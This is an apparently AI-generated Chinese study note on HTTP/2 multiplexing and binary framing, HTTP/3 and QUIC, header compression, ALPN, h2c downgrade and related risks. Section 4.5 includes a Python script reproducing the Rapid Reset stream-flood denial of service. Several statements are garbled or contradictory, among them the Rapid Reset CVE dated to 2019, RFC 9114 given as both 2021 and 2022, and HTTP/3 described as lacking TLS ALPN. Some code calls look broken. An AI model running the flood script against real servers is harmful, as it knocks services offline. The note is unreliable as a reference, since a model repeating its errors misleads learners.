---
title: "HTTP2多路复用与HTTP3核心变化"
category: "00-基础通用/03-计算机网络"
tags: [HTTP2, HTTP3, 多路复用, HPACK, QPACK, QUIC, rapid reset]
level: 主攻
type: ai-generated
status: 完成
updated: 2026-09-09
---

# HTTP2多路复用与HTTP3核心变化

> **合规声明**：本文涉及的攻防技术仅用于授权测试与学习研究，禁止用于任何未授权目标。

## 核心速查表

| 维度 | 核心内容 |
|------|----------|
| 本质定义 | HTTP/2用二进制帧+流实现单TCP连接上的多路复用，但仍受TCP队头阻塞影响；HTTP/3改用QUIC传输彻底消除传输层队头阻塞 |
| 核心用途 | Web性能优化（多资源并行）、降低延迟、连接复用；HTTP/3面向移动网络与弱网 |
| 核心机制 | 帧(Frame)/流(Stream)/HPACK/QPACK头部压缩、服务器推送(HTTP/2)、0-RTT(HTTP/3) |
| 关键参数 | 流ID、窗口(per-stream & connection)、HPACK动态表、SETTINGS帧、ALPN协议协商 |
| 常见风险 | HTTP/2 Rapid Reset(CVE-2023-44487)、h2c明文降级、请求走私跨协议、连接迁移 |
| 关联知识 | [[13-HTTP1.1：方法头部持久连接与管线化]]、[[11-UDP特性与QUIC协议设计动机]]、[[15-TLS1.2与TLS1.3握手流程逐消息解析]] |

## 1. 概述

### 1.1 技术定义

**HTTP/2**（RFC 7540, 2015）在HTTP/1.1基础上，将协议从"文本行"改为**二进制分帧**，引入**多路复用（Multiplexing）**——在单一TCP连接上并发承载多个独立的请求/响应（流），解决了HTTP/1.1的队头阻塞（所有请求必须等前一个响应完成）。它还引入HPACK头部压缩与服务器推送。

**HTTP/3**（RFC 9114, 2022）把传输层从TCP替换为QUIC（见 [[11-UDP特性与QUIC协议设计动机]]），从而**彻底移除TCP层对单流丢失造成的整体队头阻塞**。HTTP/3还支持0-RTT快速建连。

### 1.2 知识体系定位

HTTP/2、HTTP/3是HTTP演进的第2、3代，继承HTTP/1.1的语义（方法、状态码、头部、URL），但传输机制与连接管理彻底革新。理解二者差异对于：
- Web性能调优（为何CDN/流媒体/接口大量上HTTP/2/3）
- 安全研究（Rapid Reset、降级攻击、包头压缩混淆）
- 抓包分析（Frame/Stream分析方法与1.1不同）

至关重要。

### 1.3 核心应用场景

| 场景 | 采用 |
|------|------|
| 现代浏览器访问（默认HTTP/2+，支持h3） | 全景 |
| CDN/Web服务器（Cloudflare、Nginx、Apache） | 默认启用HTTP/2/3 |
| 移动App/B站/抖音长视频 | HTTP/3弱网切换 |
| 服务器推送/推送资源（虽被多数禁用） | HTTP/2特性 |

### 1.4 技术演进简史

| 时间 | 里程碑 | 说明 |
|------|--------|------|
| 2012 | SPDY（Google） | HTTP/2的前身实验 |
| 2015 | RFC 7540（HTTP/2）| IETF正式发布HTTP/2 |
| 2015 | Chrome默认启用HTTP/2 | 快速采用 |
| 2016 | QUIC原型（gQUIC） | Google废弃SPDY转向QUIC |
| 2019 | HTTP/2 Rapid Reset漏洞爆发 | CVE-2023-44487等 |
| 2021 | RFC 9000（QUIC v1）/9114（HTTP/3）| HTTP/3正式标准 |
| 2023 | CVE-2023-44487 巨量DDoS | HTTP/2 Rapid Reset攻击全球关注 |

## 2. 核心原理

### 2.1 HTTP/2：二进制分帧与多路复用

HTTP/2把所有消息（请求、响应、头部、数据）编码为**二进制帧（Frame）**，在单一TCP连接上交织传输。通过**流（Stream）**把属于同一逻辑资源的帧隔开。

```
HTTP/2 连接 (单一TCP):
  |---- STREAM 1: HEADERS(请求/响应头) + DATA(数据) ----|
  |---- STREAM 3: HEADERS + DATA (并发)              ---|
  |---- STREAM 5: HEADERS + DATA (穿插其间)           ---|
  |---- STREAM 1 续: DATA (继续) -----------------------|
      ^ 多路复用: 多个流在同一连接上并发交织
```

**帧格式（9字节帧头 + 载荷）**：

```
+-----------------------------------------------+
|         Length (24)        |   Type (8)   | Fl(8) |
+-----------------------------------------------+
|                 Stream Identifier (32)          |
+-----------------------------------------------+
|                  Frame Payload                 |
+-----------------------------------------------+
```

- **Type**：HEADERS(0x1)、DATA(0x0)、SETTINGS(0x4)、WINDOW_UPDATE(0x8)、PUSH_PROMISE(0x5)、RST_STREAM(0x3)、GOAWAY(0x7)、PING(0x6)、CONTINUATION(0x9)、PRIORITY(0x2)
- **Stream ID**：标识所属流（奇数=客户端发起，偶数=服务端服务端发起如PUSH）

### 2.2 为何HTTP/2仍然HOL阻塞

虽然有流级多路复用，HTTP/2仍跑在**单一TCP连接**上。TCP是字节流的保序可靠传输：若流属于同一TCP连接上lost的某段，TCP必须重传并等待这一整段到达后，后面的所有流都堵在被丢失段之后。

```
HTTP/2/1.1混用下的HOL:
  | S1段1 | S1段2(丢!) | S3段1 | S5段1 |
  TCP需要重组, S1段2丢失 -> S3/S5段1无法交付上层HTTP
  → S3和S5的响应也被阻塞（传输层HOL）
```

这是HTTP/2的一个已知局限。同时，TCP的拥塞控制、RTT估计、慢启动都以**整条连接**为单位，各流的流量控制耦合。

### 2.3 HTTP/3：QUIC消除传输层HOL

HTTP/3把HTTP/2的帧概念放到QUIC之上。QUIC提供**独立的、每个流独立的可靠传输**。某个流的某段丢失只影响该流，其他流可照常交付：

```
HTTP/3 基于 UDP/QUIC:
  | QUIC流1: GET /a (独立可靠交付)      |
  | QUIC流2: GET /b (独立可靠交付, 不受流1影响) |
  | QUIC流3: GET /c (独立)              |
  某流丢段只重传该流, 其余畅通无阻
```

**核心变化总结**：

| 维度 | HTTP/2 | HTTP/3 |
|------|--------|--------|
| 传输层 | TCP | UDP + QUIC |
| 握手 | TCP + TLS1.2/1.3 | QUIC(TLS1.3内嵌) |
| HOL | 有(TCP层) | 无(QUIC流独立) |
| 头部压缩 | HPACK | QPACK(适配乱序) |
| 连接迁移 | 不支持(四元组) | 支持(连接ID) |
| 0-RTT | 无 | 有(Early Data) |
| ALPN标识 | h2 | h3 |

### 2.4 HPACK（HTTP/2）与 QPACK（HTTP/3）头部压缩

**HPACK**：静态表（预定义61个常用头）+ 动态表（前64KB的最近头）+ 字面量+ 哈夫曼编码。

- 静态表：`:method GET`、`content-type`等高频头用1字节索引表示
- 动态表：连接内首次出现的头加入表，后续引用用索引

安全点：**HPACK动态表是"有状态"的**——若前端与后端对动态表状态理解不一致（例如后端重启、或中间网关解析前后端劫持），会造成"索引混淆"（HPACK Attack / CRIME变体）。现场：压缩率的差异也受**用户输入**影响（如头部值含机密），可能存在边信道（如CRIME/BREACH类攻击）。

**QPACK**：为QUIC乱序环境设计（HTTP/3的流可能乱序到达），头部字段通过专门的QPACK编码流增量同步，用"若被引用必须已就绪"机制避免歧义。

### 2.5 服务器推送（HTTP/2，HTTP/3等价物PUSH）

HTTP/2支持服务器**推送（Server Push）**：在客户端可能请求资源前，服务器主动推送给客户端（如推到CSS/JS）。

```
客户端: GET /index.html (stream 1)
服务端: 预测需要 style.css, script.js
  PUSH_PROMISE(stream 2, 声明将推 style.css)
  PUSH_PROMISE(stream 3, 声明将推 script.js)
  然后通过各自stream发送HTTP响应体
```

由于导致带宽浪费、缓存利用差、以及复杂的优先级管理，**主流浏览器已默认禁用推送**（Chrome 105+）。HTTP/3仍提供其原生形式（PUSH）。

### 2.6 ALPN 协议协商

HTTP/2与HTTP/3在TLS握手时通过**ALPN（Application-Layer Protocol Negotiation）**扩展选择：

- 客户端在ClientHello的ALPN扩展中列出优先级，如 `["h2","http/1.1"]`
- 服务端在ServerHello选择 `h2` 或 `http/1.1`
- HTTP/3用 `h3` 标识，但它走UDP443（无TLS ALPN握手，靠QUIC自己的协商）

```
ClientHello: ALPN list = ["h3", "h2", "http/1.1"]   (各版本按优先级)
ServerHello: ALPN = "h2"  (服务端最终选择, 通常选支持的最高版本)
```

ALPN降级：若支持h2的头与支持h3的UDP不通，会降级到http/1.1。这产生**协议降级攻击**风险（中间人诱使降级回弱协议）。

## 3. 详细知识点

### 3.1 HTTP/2 vs HTTP/1.1 对比（安全相关差异）

| 特性 | HTTP/1.1 | HTTP/2 | 安全影响 |
|------|----------|--------|----------|
| 消息格式 | 文本行(CRLF) | 二进制帧 | 相同HTTP语义,但CRLF注入/文本解析歧义减少 |
| 多路复用 | 无(逐请求) | 有 | 单连接多流,连接数下降 |
| 头部 | 明文文本(可能压缩/总是可读) | HPACK(压缩) | 抓包时头部需解压 |
| 连接 | keep-alive | 单一连接复用 | 单连接故障面更大 |
| 伪头 | 无 | `:method` `:path` `:authority` `:scheme` | 校验伪头很重要,防止走私 |
| 优先级 | 无 | 流优先级(依赖树) | 优先级木马攻击 |
| 取消 | 连接关闭或RST | RST_STREAM精确取消单流 | Rapid Reset滥用 |

### 3.2 流与流量控制（per-stream）

HTTP/2/3 的流控以**窗口**为单位，分为**连接级**（对整条连接数据总量）与**流级**（对单个流）。帧发送必须遵守窗口，`WINDOW_UPDATE` 增加窗口。

```
SETTINGS_INITIAL_WINDOW_SIZE (默认65535)
WINDOW_UPDATE帧 增加流/连接窗口
```
感知拥塞的调节结合对流控的攻击（如恶意放大窗口、窗口耗尽单流）是Http2攻击面。

### 3.3 HTTP/2 Rapid Reset（CVE-2023-44487）

**原理**：攻击者快速建立大量HTTP/2流，随后**立即用RST_STREAM**取消它们。服务器需要为每个流分配资源并处理取消；当取消速度快于处理，服务器资源（CPU/内存/并发连接）被耗尽，形成DDoS。

```
攻击者                                 目标服务器
  |-> HEADERS(流1) ->|                    分配资源
  |-> RST_STREAM(流1) <-|                 释放
  |-> HEADERS(流2) ->|                    再分配
  |-> RST_STREAM(流2) <-|                 ...
  每秒成千上万这样的"开流+立即取消"
  服务器忙于创建/销毁流状态 → CPU/内存耗尽 → 拒绝服务
```

2023年10月，该漏洞被用于针对Cloudflare等的大规模DDoS（峰值超 2亿 RPS）。**防御**：
- 限制单连接的并发流数（SETTINGS_MAX_CONCURRENT_STREAMS）
- 快速释放流状态与限制开流速率
- 服务端设置合理缓冲、限制HEADERS帧大小
- 检测RST_STREAM异常比率

### 3.4 h2c 明文降级风险

HTTP/2有两种：
- **h2（TLS上的HTTP/2）**：默认，经ALPN协商
- **h2c（明文HTTP/2）**：无需TLS，通过Upgrade头或prior-knowledge

**安全风险**：若应用误开放h2c（明文HTTP/2）或允许降级到明文，流量将不受保护，中间人可窃听/篡改/注入。同时，h2c的`Upgrade`头相关请求也可能被利用做"协议走私"（h2 to 1.1跨协议）。

```
客户端                 (明文) 服务器
GET / HTTP/1.1
Upgrade: h2c
Connection: Upgrade
  服务器可能响应 101 Switching Protocols → 明文HTTP2(无加密!)
```
防御：明确仅允许h2（TLS），禁用h2c/Upgrade明文路径。

### 3.5 协议降级攻击（ALPN/HTTPS降级）

HTTPS/HTTP2的降级链：`h3(UDP) → h2(TLS/TCP) → http/1.1(TLS) → 明文http`。中间人可在任一层诱导降级：

- 阻断UDP 443 → 浏览器无法h3 → 降h2
- 阻断TCP 443 或移除TLS → 降 http/1.1 明文

防御：
- HSTS（强制HTTPS）：`Strict-Transport-Security`
- 不允许TLS早期版本（TLS1.0/1.1降级），禁止known-CVE cipher suite
- 服务端ALPN严格优先选最高版本，客户端拒绝非预期降级

用curl强制/观察协商：

```bash
curl --http2 -v https://example.com -o /dev/null   # 观察 ALPN 选出 h2
curl --http1.1 -v https://example.com -o /dev/null # 默认1.1
curl --http3 -v https://cloudflare.com -o /dev/null # HTTP/3
```

## 4. 实战与示例

### 4.1 环境准备

```bash
sudo apt install -y curl nghttp2-client h2c
# nghttp2 包含 nghttp (HTTP/2 client)
# 用tcpdump观察
```

### 4.2 用 nghttp / curl 演示HTTP/2多路复用

```bash
# 使用HTTP/2客户端向支持h2的服务器发送
nghttp -v https://nghttp2.org/httpbin/get
# 观察输出中的 HEADERS / DATA / 流ID
curl --http2 -v https://example.com -o /dev/null

# 同时请求两个资源观察交织(多路复用)
curl --http2 -s -o /dev/null -w '%{http_version}\n' https://example.com/
```

用`tcpdump`抓HTTP/2帧：
```bash
sudo tcpdump -i eth0 -nn -A 'tcp port 443' | grep -A2 'HTTP/2'
# HTTP/2 数据为二进制, 抓包通常要用tshark解析
tshark -r /tmp/h2.pcap -Y 'http2' -T fields -e http2.type -e http2.stream 
```

### 4.3 用Python h2 library 自制HTTP/2客户端（观察帧）

```bash
pip install h2 hpack
```

```python
import socket, ssl
from h2.connection import H2Connection
from h2.events import ResponseReceived, DataReceived, StreamEnded
from h2.config import H2Configuration

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
raw = socket.create_connection(('example.com', 443))
sock = ctx.wrap_socket(raw, server_hostname='example.com')
assert sock.selected_alpn_protocol() == 'h2'   # ALPN选定h2

config = H2Configuration(client_side=True)
conn = H2Connection(config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# 发送一个请求 (stream 1)
stream_id = conn.get_next_available_stream_id()
headers = [(':method','GET'),(':scheme','https'),
           (':authority','example.com'),(':path','/')]
conn.send_headers(stream_id, headers, end_stream=True)
sock.sendall(conn.data_to_send())

# 读帧
data = sock.recv(65535)
events = conn.receive_data(data)
for ev in events:
    if isinstance(ev, ResponseReceived):
        print(ev.headers)
    elif isinstance(ev, DataReceived):
        print(ev.data)
```

### 4.4 演示HTTP/3（curl3 / 浏览器）

```bash
curl --http3 -v https://cloudflare.com -o /dev/null
# 观察: 走UDP443, ALPN协商为 h3
# 用tcpdump确认UDP443
sudo tcpdump -i eth0 -nn 'udp port 443' -c 10
```

若curl不带http3支持，用Chrome `--enable-quic` + `chrome://net-internals/#quic` 查看。

### 4.5 复现HTTP/2 Rapid Reset（授权用户态测试）

用Python h2 快速开流+取消流，观察服务器资源（在本地Nginx with http2测试）：

```python
import socket, ssl, time
from h2.connection import H2Connection
def clamp(sock, example='127.0.0.1', port=443):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    raw = socket.create_connection((example, port))
    s = ctx.wrap_socket(raw, server_hostname=example)
    conn = H2Connection(client_side=True)
    conn.initiate_connection()
    s.sendall(conn.data_to_send())
    start = time.time()
    count = 0
    while time.time() - start < 5:
        sid = conn.get_next_available_stream_id()
        conn.send_headers(sid, [(':method','GET'),(':path','/'),
                                (':scheme','https'),(':authority',example)], end_stream=False)
        conn.reset_stream(sid)             # 立即RST_STREAM
        count += 1
        if not conn.data_to_send():
            pass
    s.sendall(conn.data_to_send())
    print(f"在5秒内产生 {count} 个流并立即取消")
    s.close()
clamp(None)
```
**仅限本地授权环境**，勿对公网发起。

### 4.6 报错与解决

| 现象 | 原因 | 解决 |
|------|------|------|
| `curl: (16) HTTP/2 stream 0 was not closed cleanly` | 服务器主动GOAWAY/RST | 检查服务器配置、重试、或确认是Rapid Reset防护 |
| `h2 not negotiated` ALPN失败 | 目标不支持HTTP/2 | 换支持h2的目标或降级验证 |
| h2 Python库报 TLS版本/ALPN错 | 服务器TLS1.2限制 | 调适TLS最低版本、检查ALPN扩展 |
| 浏览器一直用http/1.1 | 服务器CDN/代理关h2 | 服务端Nginx/Apache启用http2模块 |
| UDP443被防火墙黑洞 → h3失败静默 | NAT/防火墙 | 测试UDP443可达性；应用做DoH等兜底 |

## 5. 常见坑与避坑指南

1. **HTTP/2不等同于"更安全"**：二进制帧消除文本注入，但引入新的解析歧义（帧大小、流状态、HPACK表状态）。Rapid Reset、HPACK混淆、跨协议走私都是新攻击面。别因"加密+二进制"放松安全审查。

2. **h2c明文未启用保护**：允许h2c（明文HTTP2）等于把流量明文暴露，且可能被中间人利用做协议走私。强制默认TLS、必须启用ALPN为h2/h3，绝不开放未加密的HTTP/2端点。

3. **忽视ALPN协商的降级**：只开通h2而客户端仍可被诱导降到http/1.1明文。始终配HSTS并禁止早期TLS版本。

4. **Rapid Reset防护只看连接数**：攻击的高效在于"开流+取消"比率而非连接数。监控SETTINGS/并发流数与RST_STREAM频率，而不是只限制TCP连接。

5. **安全坑：HPACK/QPACK索引状态**：前端CDN与后端对动态表状态不一致时会造成解码错误/信息泄漏（类似压缩边信道）。确保中间层透传HTTP/2/3时状态一致或显式转换。

6. **HTTP/2请求走私的跨协议**：HTTP/2请求可被逆向``降级``转发为HTTP/1.1（前端接h2、后端用1.1），若后端对header伪头/边界解析有差异，仍可走私（跨协议走私）。测试时考虑"h2→1.1"转发链。

7. **连接迁移测试遗漏**：HTTP/3连接迁移在移动网络中常见。测试要覆盖WiFi↔4G切换场景，确认连接ID/hosting、Early Data的重放风险。

## 6. 知识关联

- [[13-HTTP1.1：方法头部持久连接与管线化]] —— HTTP/2/3要解决的问题（1.1的队头阻塞、连接模型）
- [[11-UDP特性与QUIC协议设计动机]] —— HTTP/3的传输层QUIC原理
- [[15-TLS1.2与TLS1.3握手流程逐消息解析]] —— TLS1.3内嵌QUIC、0-RTT技术基础
- [[01-HTTP请求走私：CL-TE与TE-CL]] —— 跨协议/伪头走私的具体利用
- [[16-抓包实战：tcpdump过滤与Wireshark协议还原]] —— HTTP/2帧与HTTP/3流抓包分析方法

## 7. 参考资料

| 类型 | 资源 | 说明 |
|------|------|------|
| RFC | [RFC 7540 - Hypertext Transfer Protocol Version 2](https://www.rfc-editor.org/rfc/rfc7540) | HTTP/2规范 |
| RFC | [RFC 7541 - HPACK](https://www.rfc-editor.org/rfc/rfc7541) | HTTP/2头部压缩 |
| RFC | [RFC 9114 - HTTP/3](https://www.rfc-editor.org/rfc/rfc9114) | HTTP/3规范 |
| RFC | [RFC 9000 - QUIC](https://www.rfc-editor.org/rfc/rfc9000) | QUIC传输 |
| CVE | CVE-2023-44487 - HTTP/2 Rapid Reset | Rapid Reset漏洞分析 |
| 安全 | Cloudflare - "HTTP/2 Rapid Reset: deconstructing the record-breaking attack" | Rapid Reset攻击深度剖析 |
| 工具 | nghttp2 (`nghttp`)、`h2`/`hpack`(Python)、curl、tshark | 客户端/抓包分析工具 |
| 教程 | Mozilla Developer Network - HTTP/2 & HTTP/3 | 面向Web安全的权威MDN |
| 书 | 《HTTP/2 in Action》Barry Pollard | HTTP/2实战与调优 |
